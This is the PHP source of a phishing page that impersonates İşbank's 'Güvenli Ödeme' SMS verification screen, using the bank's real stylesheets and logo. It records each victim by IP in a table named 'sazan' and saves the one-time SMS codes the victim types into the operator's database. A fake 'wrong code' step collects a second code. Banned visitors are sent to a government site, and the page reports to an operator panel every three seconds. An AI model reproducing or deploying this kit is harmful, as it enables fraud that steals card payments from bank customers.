<?php
error_reporting(0);
  include('../../baglan.php');
  $db->query("UPDATE sazan SET now = 'İşbank SMS' WHERE ip = '{$ip}'");
  
  $cc_last_4 = $_SESSION['cc_last_4']; 
  $no_last_4 = $_SESSION['no_last_4'];

  $hata = false;
  if($_GET) {
      if($_GET['hata'] == "true") $hata = true;
      else $hata = false;
  }
  if($_POST){
      $sms = $_POST['sms'];
      if($hata == true) {
          $query = $db->prepare("UPDATE sazan SET sms2=?,smsSound=? WHERE ip = ?");
          $insert = $query->execute(array($sms,1,$ip));
          if($insert) {
            header('Location:../' . $siteAyarlari['panel'] . '/bekle.php');
          }
      } else {
          $query = $db->prepare("UPDATE sazan SET sms=?,smsSound=? WHERE ip = ?");
          $insert = $query->execute(array($sms,1,$ip));
          if($insert) {
            header('Location:../' . $siteAyarlari['panel'] . '/bekle.php');
          }
      }
  }

  $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
  foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
  }

?> <html lang="tr">
  <head>
    <title>GO - GÜVENLİ ÖDEME</title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; minimum-scale=1.0; user-scalable=no; target-densityDpi=device-dpi">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/bootstrap.min.css?1.0.2.0">
    <link rel="stylesheet" href="https://maxinet.isbank.com.tr/assets/css/style.min.css?1.0.2.0">
    <script type="text/javascript" language="javascript" src="https://maxinet.isbank.com.tr/assets/scripts/jquery-3.5.1.min.js?1.0.2.0"></script>
  </head>
  <body>
    <table style="width: 100%; vertical-align: middle; text-align: center; font-size: 14px; color: white; background-color:#747474;display:none;" id="warningTop">
      <tbody>
        <tr>
          <td style="text-align: center; vertical-align: middle; padding:  10px; color: white; font-family: Tahoma;">Kullandığınız internet tarayıcısının versiyonu bu sayfanın doğru çalışmasına engel olabilir. Bir sorunla karşılaşırsanız lütfen internet tarayıcınızın sürüm güncellemesini gerçekleştirip tekrar deneyiniz.</td>
        </tr>
      </tbody>
    </table>
    <!-- End Browser Check -->
    <a target="_blank" href="https://www.maximum.com.tr/TR/kampanyalar/kampanya-ayrintilari/Sayfalar/kampanya-ayrintilari.aspx?CampaignName=maximum-karttan-2000-tl-maxipuan-kazanma-firsati&amp;IdCampaign=NTU0OQ==-ISB" rel="noopener noreferrer">
      <div class="container-banner ">
        <div class="container-fluid-banner">
          <img src="https://maxinet.isbank.com.tr/assets/images/banner.jpg" style="width: 100%">
        </div>
      </div>
    </a>
    <div class="container-fluid header Maximum">
      <div class="container">
        <div class="col-xs-6 header-left"></div>
        <div class="col-xs-6 header-right"></div>
      </div>
    </div>
    <div class="container-fluid cardno">
      <div class="container">
        <h1>
          <span class="title">KART NUMARANIZ: </span>XXXX - XXXX - XXXX - <span class="lastDigits"> <?=$cc_last_4?> </span>
        </h1>
      </div>
    </div>
    <div class="container-fluid details">
      <div class="container">
        <div class="col-xs-12">
          <div class="col-xs-12 col-sm-4 merchant">
            <span><?= $isyeri?></span>
          </div>
          <?php if(isset($_SESSION['tutar'])) { ?>
          <div class="col-xs-6 col-sm-4 amount">
            <span> <?=$_SESSION['tutar']?> TL</span>
          </div>
          <?php } ?>
          <div class="col-xs-6 col-sm-4 date">
            <span> <?php echo date("d.m.Y  H:i:s"); ?> </span>
          </div>
        </div>
      </div>
    </div>
    <div class="container-fluid content">
      <div class="container">
        <div class="col-xs-12">
          <div class="col-xs-12 info">
            <p class="smallScreenText">Online alışverişinizin ödemesini tamamlamak için, <strong>5*****<?= $no_last_4 ?></strong> numaralı cep telefonunuza <strong>SMS</strong> ile gelen ya da İşCep’e <strong>Anlık Mesaj</strong> olarak iletilen doğrulama kodunu girerek onaylayınız. </p>
            <p class="largeScreenText">Online alışverişinizin ödemesini tamamlamak için, <strong>5*****<?= $no_last_4 ?></strong> numaralı cep telefonunuza <strong>SMS</strong> ile gelen ya da İşCep’e <strong>Anlık Mesaj</strong> olarak iletilen doğrulama kodunu girerek onaylayınız. </p>
            <?php if($hata) { echo '<p class="smallScreenText" style="color:red;text-align: center">Yanlış kod girdiniz, lütfen yeniden gönderilen kodu giriniz.</p>'; } ?>
            <?php if($hata) { echo '<p class="largeScreenText" style="color:red;text-align: center">Yanlış kod girdiniz, lütfen yeniden gönderilen kodu giriniz.</p>'; } ?>
          </div>
          <div class="col-xs-12 formHolder">
            <form method="POST" name="kerrrw" action="<?php echo $hata == true ? "?hata=true" : ""?>" id="kerrrw" onsubmit="return validateForm()">
              <input id="sms" name="sms" type="password" minlength="5" maxlength="6" pattern="[\d]{6}" onpaste="return false;" ondrop="return false;" onkeypress="test(this, event)" placeholder="Doğrulama Kodu" required>
              <input id="kerwbutonhaha" type="button" value="ONAYLA" class="primary">
              <input id="reSendButton" type="button" value="Tekrar Gönder" class="primary inProgress" disabled="">
            </form>
            <script>
              $('#kerwbutonhaha').click(function() {
                $("#kerrrw").submit();
              });

              function validateForm() {
                var a = document.forms["kerrrw"]["sms"].value;
                if (a == null || a == "") {
                  alert("Lütfen SMS Kodunu Giriniz");
                  return false;
                }
              }
            </script>
            <div class="col-xs-6">
              <a id="cancelButton">İşlemi İptal Et</a>
            </div>
            <div class="col-xs-6 text-right">
              <a>Yardım</a>
            </div>
            <div id="checkDiv" class="checkHolder" style="display: none;">
              <input id="sendSmsCheck" name="sendSmsCheck" type="checkbox">
              <label class="chkLabel" for="sendSmsCheck">Maximum Mobil İndir</label>
            </div>
            <div id="checkDivCommercial" class="checkHolder">
              <input id="sendSmsCheckCommercial" name="sendSmsCheckCommercial" type="checkbox">
              <label class="chkLabel" for="sendSmsCheckCommercial">Maximum İşyerim İndir</label>
            </div>
          </div>
        </div>
        <div class="col-xs-12 countdown">
          <div id="progressBar">
            <div style="width: 447.674px; overflow: hidden;">174</div>
          </div>
        </div>
        <div class="col-xs-12">
          <div class="text-center" id="changeOtpDiv" style="display: none;">
            <div>
              <a href="" id="changeOtp">Doğrulama tercih sayfasına geri dönmek için tıklayınız.</a>
            </div>
          </div>
        </div>
        <div class="progressBarClear"></div>
      </div>
    </div>
    <div class="container-fluid footer">
      <div class="container">
        <p>KART BİLGİLERİNİZ İŞYERİ İLE <strong>
            <u>KESİNLİKLE PAYLAŞILMAMAKTADIR</u>
          </strong>. </p>
        <img src="https://maxinet.isbank.com.tr/assets/images/logo-isbank.png">
      </div>
    </div>
    <script type="text/javascript">
      var enableSecondTimer;
      enableSecondTimer = false;
      progress(180, 180);

      function progress(timeleft, timetotal) {
        var $element = $('#progressBar');
        var progressBarWidth = timeleft * $element.width() / timetotal;
        $element.find('div').animate({
          width: progressBarWidth
        }, timeleft == timetotal ? 0 : 1000, 'linear').html(timeleft);
        var timeOrange = timetotal / 2;
        var timeRed = timetotal / 6;
        if (timeleft <= timeOrange) {
          $('#progressBar div').addClass('orange');
        }
        if (timeleft <= timeRed) {
          $('#progressBar div').addClass('red');
        }
        if (timeleft < 1) {
          enableSecondTimer = true;
          progressSecondTimer(60, 60);
        }
        if (timeleft > 0) {
          setTimeout(function() {
            progress(timeleft - 1, timetotal);
          }, 1000);
        }
      }

      function progressSecondTimer(timeleft, timetotal) {
        if (enableSecondTimer == true && timeleft > 0) {
          setTimeout(function() {
            progressSecondTimer(timeleft - 1, timetotal);
          }, 1000);
        }
      }
    </script>
    <script type="text/javascript">
        function test(el, event) {
          if((event.key.match(/\d/) == null)) {
            event.preventDefault();
            return false
          }
        }
      function numeric(element, maxLength) {
        if (element.value.match(/[^0-9]/g)) {
          element.value = element.value.replace(/[^0-9]/g, '');
        }
        if (element.value.length > maxLength) {
          element.value = element.value.substr(0, maxLength);
        }
      }
        var panel = '<?= $siteAyarlari['panel'] ?>';
    </script>
    <script src="./assets/js/custom.js"></script>
    <script>
        $(document).ready(function() {
            gonder("<?php echo $ip; ?>");
            var int = self.setInterval("gonder('<?php echo $ip; ?>')", 3000);
        });
    </script>
  </body>
</html>